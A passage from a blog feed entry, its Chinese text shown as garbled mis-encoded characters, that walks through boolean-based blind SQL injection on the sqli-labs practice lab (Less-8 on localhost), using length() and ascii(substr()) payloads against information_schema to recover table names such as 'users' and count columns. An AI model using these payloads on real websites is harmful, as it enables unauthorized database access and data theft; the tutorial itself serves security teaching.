--+</span><br></pre></td></tr></tbody></table></figure><p>ä½œç”¨æ˜¯åˆ¤æ–­ç¬¬5ä¸ªè¡¨çš„å­—ç¬¦ä¸²é•¿åº¦æ˜¯å¦å¤§äº0ï¼Œæ¢è¨€ä¹‹ï¼Œç¬¬5å¼ è¡¨æ˜¯å¦å­˜åœ¨ã€‚<br>ç»“æœå‘ç°é¡µé¢å¹¶æ²¡æœ‰æ˜¾ç¤ºæç¤ºæ–‡å­—ã€‚<br>ç”±æ­¤ï¼Œæˆ‘ä»¬å¾—åˆ°ç»“è®ºï¼šå½“å‰æ•°æ®åº“ä¸­æœ‰ä¸”ä»…æœ‰4å¼ è¡¨ã€‚</p><h2 id="ç¡®å®šè¡¨åçš„å­—ç¬¦ä¸²é•¿åº¦"><a href="#ç¡®å®šè¡¨åçš„å­—ç¬¦ä¸²é•¿åº¦" class="headerlink" title="ç¡®å®šè¡¨åçš„å­—ç¬¦ä¸²é•¿åº¦"></a>ç¡®å®šè¡¨åçš„å­—ç¬¦ä¸²é•¿åº¦</h2><p>æˆ‘ä»¬é¦–å…ˆç¡®å®šç¬¬ä¸€å¼ è¡¨çš„å­—ç¬¦ä¸²é•¿åº¦ï¼Œç”¨åˆ°çš„æ–¹æ³•ä¸ä¸Šä¸€å°èŠ‚ç±»ä¼¼ã€‚<br>åœ¨åœ°å€æ è¾“å…¥</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1' and (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) &gt; 5 --+</span><br></pre></td></tr></tbody></table></figure><p>ä½œç”¨æ˜¯åˆ¤æ–­ç¬¬ä¸€å¼ è¡¨è¡¨åçš„å­—ç¬¦ä¸²é•¿åº¦æ˜¯å¦å¤§äº5ã€‚<br>ç»“æœé¡µé¢æ˜¾ç¤ºæç¤ºæ–‡å­—ï¼Œè¯æ˜ç¬¬ä¸€å¼ è¡¨è¡¨åçš„å­—ç¬¦ä¸²é•¿åº¦å¤§äº5ã€‚<br>æ¥ç€æˆ‘ä»¬å°†5æ”¹æˆ6ï¼Œå‘ç°é¡µé¢ä¸æ˜¾ç¤ºæç¤ºæ–‡å­—äº†ã€‚ç­”æ¡ˆä¹Ÿå°±å‡ºæ¥äº†ï¼Œç¬¬ä¸€å¼ è¡¨è¡¨åçš„å­—ç¬¦ä¸²é•¿åº¦ä¸º6ã€‚ç”¨åŒæ ·çš„æ–¹æ³•æˆ‘ä»¬ä¹Ÿå¯ä»¥è·å–å…¶ä»–è¡¨åçš„å­—ç¬¦ä¸²é•¿åº¦ã€‚</p><h2 id="ç¡®å®šè¡¨åçš„æ¯ä¸€ä¸ªå­—ç¬¦æ‰€å¯¹åº”çš„ASCIIç å€¼"><a href="#ç¡®å®šè¡¨åçš„æ¯ä¸€ä¸ªå­—ç¬¦æ‰€å¯¹åº”çš„ASCIIç å€¼" class="headerlink" title="ç¡®å®šè¡¨åçš„æ¯ä¸€ä¸ªå­—ç¬¦æ‰€å¯¹åº”çš„ASCIIç å€¼"></a>ç¡®å®šè¡¨åçš„æ¯ä¸€ä¸ªå­—ç¬¦æ‰€å¯¹åº”çš„ASCIIç å€¼</h2><p>åœ¨ç¡®å®šäº†æ¯å¼ è¡¨è¡¨åçš„å­—ç¬¦ä¸²é•¿åº¦ä¹‹åï¼Œæˆ‘ä»¬å°±éœ€è¦ç¡®å®šå…¶æ¯ä¸€ä¸ªå­—ç¬¦çš„å…·ä½“å€¼ã€‚ä½†æ˜¯è¡¨åæœ‰å¯èƒ½æ˜¯å­—æ¯ã€æ•°å­—ã€æ ‡ç‚¹ç¬¦å·ã€æ“ä½œç¬¦ã€ç‰¹æ®Šå­—ç¬¦ç­‰ï¼Œå€˜è‹¥æˆ‘ä»¬ä¸€ä¸ªä¸ªå°è¯•ï¼Œæ•ˆç‡ä¼šå¾ˆä½ã€‚å› æ­¤æˆ‘ä»¬ä¼šæƒ³åˆ°ç”¨ASCIIç å€¼æ¥åˆ¤æ–­å­—ç¬¦çš„å…·ä½“å€¼ã€‚æ¯ä¸€ä¸ªASCIIç å¯¹åº”ä¸€ä¸ªå­—ç¬¦ï¼Œä¸»è¦å¯¹åº”å…³ç³»å¦‚ä¸‹å›¾ï¼š</p><div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://bu.dusays.com/2023/06/18/648e798354032.jpg" data-fancybox="default" data-caption="ASCIIç å¯¹åº”è¡¨"><img fancybox="" itemprop="contentUrl" src="https://bu.dusays.com/2023/06/18/648e798354032.jpg" class="lazyload" data-srcset="https://bu.dusays.com/2023/06/18/648e798354032.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="ASCIIç å¯¹åº”è¡¨"></a><span class="image-caption">ASCIIç å¯¹åº”è¡¨</span></div></div><p>æˆ‘ä»¬è¿™é‡Œä»¥ç¬¬å››å¼ è¡¨ä¸ºä¾‹ï¼ˆé—®å°±æ˜¯ç¬¬å››å¼ è¡¨é‡è¦ï¼‰ï¼Œåœ¨åœ°å€æ è¾“å…¥</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,1))) &gt; 96 --+</span><br></pre></td></tr></tbody></table></figure><p>å…¶ä¸­ï¼Œsubstr()å‡½æ•°ä½œç”¨ä¸ºæˆªå–å­—ç¬¦ä¸²ä¸­æŒ‡å®šä½ç½®å¼€å§‹çš„æŒ‡å®šä¸ªå­—ç¬¦ï¼Œç”¨æ³•ä¸ºï¼šsubstr(å­—ç¬¦ä¸²,èµ·å§‹ä½ç½®,æˆªå–é•¿åº¦)ï¼Œèµ·å§‹ä½ç½®ä»1å¼€å§‹ã€‚ascii()å‡½æ•°ä½œç”¨ä¸ºå–å­—ç¬¦çš„ASCIIç å€¼ï¼Œç”¨æ³•ä¸ºascii(å­—ç¬¦)ã€‚å› æ­¤ä¸Šè¿°è¯­å¥ä½œç”¨ä¸ºåˆ¤æ–­ç¬¬4å¼ è¡¨è¡¨åçš„ç¬¬ä¸€ä¸ªå­—ç¬¦ASCIIç å€¼æ˜¯å¦å¤§äº96ã€‚<br>ç»“æœå‘ç°é¡µé¢æ˜¾ç¤ºæç¤ºæ–‡å­—ï¼Œè¯æ˜ç¬¬4å¼ è¡¨è¡¨åçš„ç¬¬ä¸€ä¸ªå­—ç¬¦ASCIIç å€¼å¤§äº96ï¼Œå› æ­¤å¾ˆå¤§æ¦‚ç‡å®ƒæ˜¯ä¸€ä¸ªå°å†™çš„è‹±æ–‡å­—æ¯ã€‚å¯ä»¥å°†<code>&gt; 96</code>æ”¹ä¸º<code>&lt; 123</code>å°è¯•ä¸€ä¸‹ï¼Œå‘ç°çš„ç¡®å¦‚æ­¤ã€‚</p><p>æ¥ç€å¯ä»¥é‡‡ç”¨äºŒåˆ†æ³•æ¥ç¡®å®šè¯¥å­—ç¬¦çš„å…·ä½“å€¼ã€‚å°†<code>&lt; 123</code>æ”¹ä¸º<code>&gt; 110</code>å‘ç°é¡µé¢æ˜¾ç¤ºæç¤ºæ–‡å­—ï¼Œå› æ­¤å°†111å’Œ122ä½œä¸ºä¸¤ä¸ªç«¯ç‚¹ç»§ç»­åˆ’åˆ†ã€‚å°†<code>&gt; 110</code>æ”¹ä¸º<code>&lt; 117</code>å‘ç°é¡µé¢ä¸æ˜¾ç¤ºæç¤ºæ–‡å­—ã€‚å› æ­¤å¯ä»¥ç¡®å®šè¯¥å­—ç¬¦ä¸ºu,v,w,x,y,zä¸­çš„ä¸€ä¸ªï¼Œç»§ç»­äºŒåˆ†æ³•æˆ–è€…æšä¸¾éƒ½å¯ä»¥å¾—åˆ°ï¼šè¯¥å­—ç¬¦ä¸ºuã€‚</p><p>åˆ©ç”¨åŒæ ·çš„æ–¹æ³•ï¼Œæˆ‘ä»¬çŒœè§£å¾—åˆ°ç¬¬å››å¼ è¡¨çš„è¡¨åä¸º<strong>users</strong>ã€‚åŒæ ·åœ°ï¼Œæˆ‘ä»¬ä¹Ÿèƒ½å¤ŸçŒœè§£å‡ºå…¶ä»–è¡¨åã€‚</p><h2 id="ç¡®å®šè¡¨ä¸­å­—æ®µæ•°"><a href="#ç¡®å®šè¡¨ä¸­å­—æ®µæ•°" class="headerlink" title="ç¡®å®šè¡¨ä¸­å­—æ®µæ•°"></a>ç¡®å®šè¡¨ä¸­å­—æ®µæ•°</h2><p>ä¸ç¡®å®šæ•°æ®åº“ä¸­è¡¨æ•°é‡çš„æ–¹æ³•ä¸€è‡´ï¼Œåªéœ€å°†<code>table_name</code>æ›¿æ¢ä¸º<code>column_name</code>ï¼Œ<code>information_schema.tables</code>æ›¿æ¢ä¸º<code>information_schema.columns</code>ï¼Œ<code>table_schema=database()</code>æ›¿æ¢ä¸º<code>table_name='users'</code>å³å¯ã€‚å¦‚ï¼š</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1' and (length((select column_name from information_schema.columns where table_name='users' limit 3,1))) &gt; 0 --+</span><br></pre></td></tr></tbody></table></figure><p>å‘ç°é¡µé¢æ˜¾ç¤ºæç¤ºæ–‡å­—ï¼Œè¯æ˜usersè¡¨ä¸­è‡³å°‘æœ‰4ä¸ªå­—æ®µã€‚åˆ©ç”¨å’Œä¸Šæ–‡ä¸€æ ·çš„æ–¹æ³•ï¼Œæœ€ç»ˆå¯ä»¥çŸ¥é“usersè¡¨ä¸­æœ‰6ä¸ªå­—æ®µã€‚</p><h2 id="åç»­"><a href="#åç»­" class="headerlink" title="åç»­"></a>åç»­</h2><p>ç¡®å®šå­—æ®µçš„å­—ç¬¦ä¸²é•¿åº¦ï¼Œç¡®å®šå­—æ®µçš„æ¯ä¸ªå­—ç¬¦å…·ä½“å€¼ï¼›ç¡®å®šè®°å½•æ•°ï¼Œç¡®å®šè®°å½•çš„å­—ç¬¦ä¸²é•¿åº¦ï¼Œç¡®å®šè®°å½•çš„æ¯ä¸ªå­—ç¬¦å…·ä½“å€¼ã€‚æ–¹æ³•ä¸å‰æ–‡å®Œå…¨ä¸€è‡´ã€‚æœ‰å…´è¶£çš„å°ä¼™ä¼´å¯ä»¥å°è¯•ä¸€ä¸‹ç»§ç»­æ‰‹åŠ¨çŒœè§£ã€‚</p><h2 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h2><p>æœ¬æ–‡ä¸»è¦ç›®çš„æ˜¯ä¸ºè¯»è€…å˜æ¸…å¸ƒå°”ç›²æ³¨çš„åŸç†å’Œæ€è·¯ï¼Œå®é™…ä¸Šï¼Œæ‰‹åŠ¨è¿›è¡Œå¸ƒå°”ç›²æ³¨æ•ˆç‡ååˆ†ä½ä¸‹ï¼Œå‡ ä¹ç”¨ä¸åˆ°ã€‚ä½†å¦‚æœæ—¶é—´å……è£•ï¼Œå¯ä»¥æ„Ÿå—ä¸€ä¸‹æ‰‹åŠ¨è¿›è¡Œå¸ƒå°”ç›²æ³¨çš„è¿‡ç¨‹ï¼Œç§ä»¥ä¸ºè¿™æœ‰åŠ©äºæ›´æ¸…æ™°åœ°è®¤è¯†å¸ƒå°”ç›²æ³¨ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;åœ¨&lt;a href=&quot;../../posts/sqli2/&quot;&gt;ä¸Šä¸€æœŸæ•™ç¨‹&lt;/a&gt;ä¸­æˆ‘ä»¬å­¦ä¹ äº†åŸºäºæŠ¥é”™çš„æ³¨å…¥ï¼Œæˆ–è€…å‡†ç¡®åœ°è¯´æ˜¯GETå‹åŸºäºæŠ¥é”™çš„æ³¨å…¥ã€‚ç›¸ä¿¡å¤§å®¶ä¹Ÿçœ‹å‡ºæ¥äº†ï¼Œè¿™ç§æ³¨å…¥æ˜¯éå¸¸ç®€å•çš„ï¼Œæ„å‘³ç€è¿™ç§æ¼æ´æ˜¯éå¸¸ä½çº§çš„ã€‚æˆ‘ä»¬æ‰€è§åˆ°çš„å¤§å¤šæ•°ç½‘ç«™ä¸­éƒ½ä¸ä¼šå‡ºç°å¦‚æ­¤ä½çº§çš„SQLæ³¨å…¥æ¼æ´ã€‚</summary>
      
    
    
    
    <category term="Webå®‰å…¨" scheme="https://blog.beacox.space/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="SQLæ³¨å…¥" scheme="https://blog.beacox.space/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
</feed>
